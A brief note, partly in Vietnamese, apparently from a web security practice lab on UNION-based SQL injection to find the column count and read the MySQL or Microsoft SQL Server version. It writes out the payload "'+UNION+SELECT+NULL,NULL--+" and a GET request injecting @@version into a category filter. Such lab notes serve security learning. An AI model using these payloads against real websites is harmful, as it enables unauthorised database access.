# SQL injection attack, querying the database type and version on MySQL and Microsoft

để ktra cột dùng lệnh

'+UNION+SELECT+NULL,NULL--+

![image.png](SQL%20injection%20attack,%20querying%20the%20database%20type%20a/image.png)

![image.png](SQL%20injection%20attack,%20querying%20the%20database%20type%20a/image%201.png)

GET /filter?category=Accessories'+UNION+SELECT+@@version,'duck'--+
